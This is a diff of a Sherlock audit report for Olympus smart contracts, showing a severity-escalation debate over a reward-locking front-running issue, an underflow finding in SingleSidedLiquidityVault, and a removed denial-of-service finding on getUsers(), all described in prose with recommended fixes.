+Escalate for 25 USDC.
+Disagree with @IAm0x52 's comments
+
+> 1.Funds aren't actually lost because they can be rescued
+
+For users, they have lost the rewards they deserve, and even though they can get a refund afterwards, the reputation of the protocol has been compromised.
+
+> 2.This is an admin only function so unless admin was malicious and called this repeatedly the amount of locked tokens would be small.
+
+Using minimum impact to downgrade the issue here doesn't hold water.  I could say that a large number of rewards are left in aura due to a long period of no user activity, and when a malicious user observes the owner calling claimFees, he can preempt the call to getReward to make a large number of rewards locked in the contract
+
+**sherlock-admin**
+
+ > Escalate for 25 USDC.
+> Disagree with @IAm0x52 's comments
+> 
+> > 1.Funds aren't actually lost because they can be rescued
+> 
+> For users, they have lost the rewards they deserve, and even though they can get a refund afterwards, the reputation of the protocol has been compromised.
+> 
+> > 2.This is an admin only function so unless admin was malicious and called this repeatedly the amount of locked tokens would be small.
+> 
+> Using minimum impact to downgrade the issue here doesn't hold water.  I could say that a large number of rewards are left in aura due to a long period of no user activity, and when a malicious user observes the owner calling claimFees, he can preempt the call to getReward to make a large number of rewards locked in the contract
+
+You've created a valid escalation for 25 USDC!
+
+To remove the escalation from consideration: Delete your comment.
+To change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.
+
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
+
+**hrishibhat**
+
+Escalation accepted
+
+This is a valid medium
+There are multiple reasons why this issue should be medium, 
+While there is still a dos attack possible, funds are not lost. And can be recovered by admin.
+Also, the claimFees is an admin function. 
+This does not break the core functionality but a DOS of rewards. Hence medium is fair
+
+**sherlock-admin**
+
+> Escalation accepted
+> 
+> This is a valid medium
+> There are multiple reasons why this issue should be medium, 
+> While there is still a dos attack possible, funds are not lost. And can be recovered by admin.
+> Also, the claimFees is an admin function. 
+
+This issue's escalations have been accepted!
+
+Contestants' payouts and scores will be updated according to the changes made on this issue.
+
+
+
+# Issue M-10: SingleSidedLiquidityVault._accumulateInternalRewards will revert with underflow error if rewardToken.lastRewardTime is bigger than current time 
 
 Source: https://github.com/sherlock-audit/2023-02-olympus-judging/issues/44 
 
 ## Found by 
-GimelSec, hansfriese, xAlismx, cccz, 0x52, rvierdiiev, cducrest-brainbot, joestakey, mahdikarimi, Ruhum
+joestakey, cccz, mahdikarimi, xAlismx, hansfriese, GimelSec, cducrest-brainbot, 0x52, Ruhum, rvierdiiev
 
 ## Summary
 SingleSidedLiquidityVault._accumulateInternalRewards will revert with underflow error if rewardToken.lastRewardTime is bigger than current time
@@ -1261,53 +1023,4 @@ Manual Review
 
 ## Recommendation
 Skip token if it's `lastRewardTime` is in future.
-
-# Issue M-13: DOS attack to getUsers() 
-
-Source: https://github.com/sherlock-audit/2023-02-olympus-judging/issues/27 
-
-## Found by 
-hake, tsvetanovv, GimelSec, chaduke
-
-## Summary
-The getUser() function will return the whole array of users. It will run out of gas if a malicious user deposits will small amounts for a long list of wallet addresses. 
-
-## Vulnerability Detail
-The ``getUser()`` function needs to return the whole array of users in memory, which needs memory copy operation. As a result, when the list is too long, it will run out of gas. 
-
-[https://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L334-L336](https://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L334-L336)
-
-Meanwhile, a malicious can deposit with small amount for a long list of wallet addresses to increase the length of the array ``users``.
-
-[https://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L187-L244](https://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L187-L244)
-
-As a result, it creates an effective DOS to the ``getUsers()`` function.
-
-## Impact
-The function ``getUsers()`` is not useful anymore when there is a DOS attack.
-
-## Code Snippet
-See above
-
-## Tool used
-VSCode
-
-Manual Review
-
-## Recommendation
-- Revise the function ``getUsers()`` into ``getUsers(from, to)`` so that we can retrieve the users within a range of indices. 
-
-- Set up a minium deposit limit so that such attack is most costing. 
-
-## Discussion
-
-**Evert0x**
-
-Considering legit as
-
-> These LPs can be migrated to a new implementation contract and we can seed the `lpPositions` state through a combination of calling `getUsers` and then getting the `lpPositions` value for each user
-
-This functionality is described in the README
-
-
 
